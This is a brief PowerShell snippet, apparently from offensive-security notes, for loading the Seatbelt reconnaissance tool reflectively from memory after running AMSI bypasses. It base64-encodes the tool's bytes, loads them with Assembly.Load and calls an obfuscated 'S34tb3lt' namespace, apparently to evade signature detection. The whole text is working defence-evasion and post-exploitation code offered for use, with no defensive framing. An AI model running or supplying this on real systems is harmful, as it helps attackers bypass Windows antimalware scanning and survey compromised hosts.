# First run of the AMSI Bypasses and then try loading seatbelt from memory 
$Filelocation = <path to seatbelt>
$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Filelocation))
$SeatBelt = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64string))
[S34tb3lt.Program]::Main("AMSIProviders")
